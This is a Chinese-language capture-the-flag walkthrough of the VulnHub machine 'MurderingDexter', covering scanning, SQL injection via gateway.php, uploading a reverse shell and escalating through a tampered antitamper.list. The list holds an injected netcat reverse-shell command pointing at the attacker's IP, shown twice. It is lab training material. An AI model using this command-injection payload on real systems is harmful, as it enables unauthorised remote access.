# 下载地址

    
    
    https://download.vulnhub.com/botchallenges/MurderingDexter.zip
    

# **实战演练**

使用netdiscover命令查找靶机的IP

![image.png](https://image.3001.net/images/20190806/1565084781_5d494c6d3c928.png)  

使用nmap查看靶机开放的端口

![image.png](https://image.3001.net/images/20190806/1565084868_5d494cc4d904c.png)在浏览器打开

![image.png](https://image.3001.net/images/20190806/1565084901_5d494ce574076.png)爆破目录

![image.png](https://image.3001.net/images/20190806/1565085261_5d494e4da51bc.png)登录页面有输入框，试试注入

    
    
    POST /Panel/ HTTP/1.1
    Host: 192.168.0.107
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Referer: http://192.168.0.107/Panel/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 40
    Connection: close
    Cookie: PHPSESSID=8q075cd5s8okkfpdv4q57ns722
    Upgrade-Insecure-Requests: 1
    
    username=test&password=test&submit=Login

注入失败

![image.png](https://image.3001.net/images/20190806/1565085629_5d494fbd8ce4a.png)查看一下资料，找到gateway.php存在SQL注入漏洞，[exp](https://www.exploit-db.com/exploits/31686)

![image.png](https://image.3001.net/images/20190806/1565086207_5d4951ffe06b2.png)使用上面的凭据登录

![image.png](https://image.3001.net/images/20190806/1565086283_5d49524b7a2b8.png)上传反弹shell，显示路径出来了

![image.png](https://image.3001.net/images/20190806/1565086908_5d4954bc865a5.png)连接成功

![image.png](https://image.3001.net/images/20190806/1565086976_5d495500c02a2.png)寻找线索，发现变量s可以拼接字符串，所以可以修改这个清单，进行命令注入

![image.png](https://image.3001.net/images/20190806/1565087146_5d4955aab1d1a.png)

    
    
    {
    "';/bin/nc -nv -e /bin/sh 192.168.0.104 7777 #": "d8fa4356213b6ce9253f55acdff780ac",
        "/var/www/Panel/info.php": "d8fa4356213b6ce9253f55acdff780ac",
        "/var/www/Panel/upload.php" : "b2640cea86e5171662a082b6a043fcc2",
        "/var/www/Panel/style.css": "92f234834a61b7fde898eea40f857bb3",
        "/var/www/Panel/gateway.php": "7b93115195db0c0b085a1107c4cc1aed",
        "/var/www/Panel/pagination.php": "1a8d91c12263dd5298a70c72976c5e97",
        "/var/www/Panel/viewer.php": "292b3b12c2f90c0e557bf599c2475c15",
        "/var/www/Panel/config.php": "421fc13061ab1f343e6607e4ef4f8f42",
        "/var/www/Panel/main.php": "7812b7c1ed608299c9bece4f46607423",
        "/var/www/Panel/load.php": "0f95762562aa97c62d004949e7337e95",
        "/var/www/Panel/viewer_pagination.php": "60c7444a92daa115abfecc73c46fc2ec",
        "/var/www/Panel/master.php": "2b50c51fce89ddcfb769effdeab7080c",
        "/var/www/Panel/index.php": "af44aa507c02f3c1aede5e251b28dc64"
    }
    

权限不够修改不了

![image.png](https://image.3001.net/images/20190806/1565088193_5d4959c1654e9.png)上传list

![image.png](https://image.3001.net/images/20190806/1565088436_5d495ab4499a1.png)mv提示权限不够，换cat命令

    
    
    $ cat /var/www/Panel/exes/antitamper.list > antitamper.list
    $ cat antitamper.list
    {
    	"';/bin/nc -nv -e /bin/sh 192.168.0.104 7777 #": "d8fa4356213b6ce9253f55acdff780ac",
        "/var/www/Panel/info.php": "d8fa4356213b6ce9253f55acdff780ac",
        "/var/www/Panel/upload.php" : "b2640cea86e5171662a082b6a043fcc2",
        "/var/www/Panel/style.css": "92f234834a61b7fde898eea40f857bb3",
        "/var/www/Panel/gateway.php": "7b93115195db0c0b085a1107c4cc1aed",
        "/var/www/Panel/pagination.php": "1a8d91c12263dd5298a70c72976c5e97",
        "/var/www/Panel/viewer.php": "292b3b12c2f90c0e557bf599c2475c15",
        "/var/www/Panel/config.php": "421fc13061ab1f343e6607e4ef4f8f42",
        "/var/www/Panel/main.php": "7812b7c1ed608299c9bece4f46607423",
        "/var/www/Panel/load.php": "0f95762562aa97c62d004949e7337e95",
        "/var/www/Panel/viewer_pagination.php": "60c7444a92daa115abfecc73c46fc2ec",
        "/var/www/Panel/master.php": "2b50c51fce89ddcfb769effdeab7080c",
        "/var/www/Panel/index.php": "af44aa507c02f3c1aede5e251b28dc64"
    }
    
    

![image.png](https://image.3001.net/images/20190806/1565088832_5d495c408317e.png)![image.png](https://image.3001.net/images/20190806/1565088849_5d495c518eaf7.png)  

